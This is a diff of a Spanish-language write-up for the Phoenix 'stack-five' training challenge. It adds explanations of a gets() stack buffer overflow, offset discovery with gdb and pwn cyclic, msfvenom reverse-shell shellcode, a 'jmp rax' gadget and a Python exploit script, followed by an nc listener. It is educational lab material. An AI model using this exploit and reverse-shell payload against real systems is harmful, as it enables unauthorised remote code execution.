@@ -26,6 +26,15 @@ En este nivel de Phoenix vamos un paso más allá: en lugar de ejecutar solo fun
 - Recuerda eliminar los breakpoints antes de la ejecución final para evitar interrupciones.
 
 
+## Análisis del código
+
+El programa contiene:
+
+Un buffer de 128 bytes (buffer) en la función start_level().
+
+Uso de gets(), lo que permite escribir más allá del espacio reservado en la pila.
+
+La vulnerabilidad se encuentra en que, al no validarse el tamaño de la entrada, es posible sobrescribir la dirección de retorno. Esto permite inyectar y ejecutar código arbitrario en la pila, con el objetivo de invocar execve("/bin/sh", ...) y así obtener una shell, cumpliendo con el propósito del reto.
 
 
 ```csharp
@@ -99,7 +108,7 @@ gef➤
 
 **Desensamblar start_level**
 
-Esto nos permite ver cómo se maneja el buffer vulnerable:
+Esto nos permite ver cómo se maneja el buffer vulnerable, para desensamblar la funcion lo hacemos con el comando `disass start_level`
 
 
 ```csharp
@@ -117,14 +126,14 @@ Dump of assembler code for function start_level:
 End of assembler dump.
 ```
 
-vamos a detener la ejecución justo después de que se lea la entrada: dando un break en la linea `0x00000000004005a1 <+20>:	nop`
+vamos a detener la ejecución justo después de que se lea la entrada: dando un break en la linea **0x00000000004005a1 <+20>:	nop** y despues de enviar el buffer que está en la linea **0x0000000000400595 <+8>:	lea    rax,[rbp-0x80]** esto lo vamos a hacer con el comando `b *0x00000000004005a1`
 
 ```csharp
 gef➤  b *0x00000000004005a1
 Breakpoint 1 at 0x4005a1
 ```
 
-Ahora ejecutamos el binario con el comando `run < <(python -c 'print "A"*64')` enviando 64 A como payload 
+Ahora ejecutamos el binario con el comando `run < <(python -c 'print "A"*64')` enviando 64 A como payload y vemos la respueta de gdb
 
 ```csharp
 gef➤  run < <(python -c 'print "A"*64')
@@ -181,7 +190,7 @@ $cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
 gef➤ 
 ```
 
-Imprimir la dirección del buffer con el comando `print $rbp-0x80`
+Identificar la dirección del buffer, lo realizamos con el comando `print $rbp-0x80` y vemos que la dirección es **0x7fffffffe5a0**
 
 ```csharp
 gef➤  print $rbp-0x80
@@ -189,7 +198,7 @@ $1 = (void *) 0x7fffffffe5a0
 gef➤
 ```
 
-ahora con el comando `info frame` vamos a ver el marco de pila, el **saved rip** es la **dirección de retorno** que el procesador guarda automáticamente en la pila cuando se llama a una función, con total de data que le enviamos aún no lo pisamos así que vamos a ver cual es la diferencia entre el buffer y el RIP
+ahora con el comando `info frame` vamos a ver el marco de pila, el **saved rip** es la **dirección de retorno** que el procesador guarda automáticamente en la pila cuando se llama a una función, con el total de la data que le enviamos aún no lo pisamos así que vamos a ver cual es la diferencia entre el buffer y el RIP
 
 ```csharp
 gef➤   info frame
@@ -203,9 +212,9 @@ Stack level 0, frame at 0x7fffffffe630:
 gef➤ 
 ```
 
-Aunque en el código se reservaron 128 bytes para el buffer, podemos usar el comando find 0x7fffffffe5a0, +200, 0x4005c7 para ubicar en memoria la dirección de retorno (saved RIP) asociada a 0x4005c7.
+Aunque en el código se reservaron 128 bytes para el buffer, podemos usar el comando `find 0x7fffffffe5a0, +200, 0x4005c7` para ubicar en memoria la dirección de retorno (saved RIP) que ya la conocemos y es  **0x4005c7**
 
-En este ejemplo, buscamos a partir de la dirección de inicio del buffer (0x7fffffffe5a0) un rango de 200 bytes y localizamos el valor 0x4005c7
+En este ejemplo, buscamos a partir de la dirección de inicio del buffer **0x7fffffffe5a0** un rango de 200 bytes para localizar el valor **0x4005c7** y como resultado tenemos la dirección **0x7fffffffe628**
 
 ```csharp
 gef➤  find 0x7fffffffe5a0, +200, 0x4005c7
@@ -214,7 +223,7 @@ gef➤  find 0x7fffffffe5a0, +200, 0x4005c7
 gef➤ 
 ```
 
-Debemos hacer es una resta para saber el valor total del offset con el comando `printf "%i\n",0x7fffffffe628 - 0x7fffffffe5a0` y así tenemos el dato para el offset
+Esto lo estamos realizando para ver una forma de encontrar el offset de este reto que sería restarle a la dirección de retorno (saved RIP) **0x7fffffffe628** la dirección del buffer **0x7fffffffe5a0** que lo podemos hacer con el comando `printf "%i\n",0x7fffffffe628 - 0x7fffffffe5a0` y así tenemos el dato para el offset
 
 ```csharp
 gef➤  printf "%i\n",0x7fffffffe628 - 0x7fffffffe5a0
@@ -222,7 +231,7 @@ gef➤  printf "%i\n",0x7fffffffe628 - 0x7fffffffe5a0
 gef➤
 ```
 
-También podemos tener el offset con la herramienta pwn cyclic de la librería Pwntools, vamos a realizar este proceso desde el principio para que nos quede más claro, lo primero es correr el binario con gdb y poner el break para realizar la validación 
+También podemos tener el offset con la herramienta pwn cyclic de la librería Pwntools como lo realizamos en el reto anterior, vamos a realizar este proceso desde el principio para que nos quede más claro, lo primero es correr el binario con gdb y poner el break para realizar la validación 
 
 ```csharp
 user@phoenix-amd64:/opt/phoenix/amd64$ gdb -q stack-five
@@ -256,7 +265,7 @@ Welcome to phoenix/stack-five, brought to you by https://exploit.education
 
 ```
 
-Generamos un **patrón único** con `pwn cyclic` (Pwntools) para provocar un crash y luego identificar el offset exacto donde se sobrescribe el **saved RIP**
+Generamos un **patrón único** con la herramienta pwn cyclic (Pwntools) para provocar un crash y luego identificar el offset exacto donde se sobrescribe el **saved RIP**
 
 ```csharp
 ┌──(root㉿angussMoody)-[/mnt/angussMoody/PWN/Phoenix/Binarios/5_stack-five]
@@ -264,7 +273,7 @@ Generamos un **patrón único** con `pwn cyclic` (Pwntools) para provocar un cra
 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
 ```
 
-Y este patrón es el que le enviamos al binario 
+Y este patrón lo copiamos y lo pegamos en el dato que está esperando el binario 
 
 ```csharp
 gef➤  r
@@ -321,7 +330,7 @@ $cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
 gef➤
 ```
 
-ahora con el comando `info frame` vamos a ver la información del saved rip y vemos que ya pisamos este valor en este caso el valor quedó en saved rip es `0x6261616b6261616a`
+ahora con el comando `info frame` vamos a ver la información del **saved rip** y vemos que ya pisamos este valor en este caso el valor quedó en saved rip es **0x6261616b6261616a**
 
 ```csharp
 gef➤  info frame
@@ -335,7 +344,7 @@ Stack level 0, frame at 0x7fffffffe630:
 gef➤ 
 ```
 
-Usamos `pwn cyclic -l <valor>` para localizar dentro del patrón el offset exacto que sobreescribe el **saved RIP**. En este caso, el valor `0x6261616b6261616a` que vimos en RIP durante el crash corresponde al byte número **136** de la cadena enviada, por lo que el **desplazamiento desde el inicio del buffer hasta el saved RIP** es de 136 bytes.
+Usamos `pwn cyclic -l <valor>` para localizar dentro del patrón el offset exacto que sobreescribe el **saved RIP**. En este caso, el valor **0x6261616b6261616a** que vimos en RIP durante el crash, con esto confirmamos que el **desplazamiento desde el inicio del buffer hasta el saved RIP** es de 136 bytes, creo que esta forma es más fácil, pero se aprovechó este reto para mostrar dos formar de encontrar el offset.
 
 ```csharp
 ┌──(root㉿angussMoody)-[/mnt/angussMoody/PWN/Phoenix/Binarios/5_stack-five]
@@ -343,7 +352,7 @@ Usamos `pwn cyclic -l <valor>` para localizar dentro del patrón el offset exact
 136
 ```
 
-La pila para `start_level` se organiza con 128 bytes reservados para el buffer local, seguidos de 8 bytes para el *Saved RBP* y, finalmente, 8 bytes para el *Saved RIP* (dirección de retorno). Por lo tanto, desde el inicio del buffer hasta el *Saved RIP* hay **128 + 8 = 136 bytes**, que es el valor que debemos escribir para sobreescribir la dirección de retorno.
+Para que quede un poco más claro podemos graficar la pila para `start_level` y esta se organiza con 128 bytes reservados para el buffer local, seguidos de 8 bytes para el *Saved RBP* y, finalmente, 8 bytes para el *Saved RIP* (dirección de retorno). Por lo tanto, desde el inicio del buffer hasta el *Saved RIP* hay **128 + 8 = 136 bytes**, que es el valor que debemos escribir para sobreescribir la dirección de retorno.
 
 ```csharp
 Direcciones (más altas)
@@ -362,7 +371,7 @@ Direcciones (más altas)
 Direcciones (más bajas)
 ```
 
-Ya tenemos el offset vamos a generar un shellcode con el comando `msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 --platform linux -a x64 -f python --var-name shellcode` para tener una reverse shell en la máquina 
+Ya que tenemos el offset vamos a generar un shellcode con el comando `msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 --platform linux -a x64 -f python --var-name shellcode` para tener una reverse shell en la máquina 
 
 ```csharp
 ┌──(root㉿angussMoody)-[/mnt/angussMoody/PWN/Phoenix/5_stack-five]
@@ -380,7 +389,9 @@ shellcode += b"\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89"
 shellcode += b"\xe7\x52\x57\x48\x89\xe6\x0f\x05"
 ```
 
-Una vez identificado el **offset** y generado el **shellcode**, necesitamos una forma de transferir el flujo de ejecución hacia nuestra carga maliciosa en memoria. Esto se logra utilizando una instrucción existente en el binario que salte a la dirección donde está nuestro shellcode. podemos buscar una con el comando `ROPgadget --binary stack-five --only "jmp"` y vemos que contamos con `0x0000000000400481 : jmp rax`
+Una vez identificado el **offset** y generado el **shellcode**, necesitamos una forma de transferir el flujo de ejecución hacia nuestra carga maliciosa en memoria. Esto se logra utilizando una instrucción existente en el binario que salte a la dirección donde está nuestro shellcode. necesitamos un **gadget** (una instrucción ya existente en el binario que te ayude a saltar al registro donde tienes la dirección de tu shellcode.) podemos buscar una con el comando `ROPgadget --binary stack-five --only "jmp"` y vemos que contamos con `0x0000000000400481 : jmp rax` 
+
+**jmp rax** lo que hace es decirle a la CPU: “Ve a la dirección que contiene el registro RAX y ejecuta lo que esté ahí. Si conseguimos que **RAX** apunte a nuestro buffer (donde está el shellcode), al ejecutar este gadget el flujo de ejecución se transfiere directamente a nuestra carga maliciosa.
 
 ```csharp
 user@phoenix-amd64:/opt/phoenix/amd64$ ROPgadget --binary stack-five --only "jmp"
@@ -409,7 +420,7 @@ shellcode += b"\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb"
 shellcode += b"\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89"
 shellcode += b"\xe7\x52\x57\x48\x89\xe6\x0f\x05"
 
-# Dirección de retorno (jmp eax o dirección que apunte a tu shellcode en memoria)
+# Dirección de retorno (jmp eax)
 ret = b"\x81\x04\x40\x00\x00\x00\x00\x00"
 
 # Construcción del payload
@@ -420,6 +431,23 @@ payload += ret
 # Imprimir a stdout para que el binario lo reciba
 import sys
 sys.stdout.buffer.write(payload)
+```
+
+Si vemos una grafica de la pila, esto es lo que realizará nuestro payload.
+
+```csharp
+
+Direcciones (más altas)
+┌─────────────────────────────┐
+│ Saved RIP  ← ahora = ret    │  <- BUF + 136 .. BUF + 143  (8 bytes)   <-- sobrescrito por `ret`
+├─────────────────────────────┤
+│ Saved RBP                   │  <- BUF + 128 .. BUF + 135  (8 bytes)   <-- sobrescrito por parte del padding
+├─────────────────────────────┤
+│ ... padding 'A' ...         │  <- BUF + 75 .. BUF + 127   (53 bytes)
+├─────────────────────────────┤
+│ shellcode (75 bytes)        │  <- BUF + 0 .. BUF + 74     (75 bytes)
+└─────────────────────────────┘
+Direcciones (más bajas)
 ```
 
 Lo que necesimos hacer para ver si el exploit funciona es ejecutarlo con el binario, pero antes debemos tener dentro de la máquina una terminal a la escucha, esto se hace con el comando `nc -nlvp 4444`
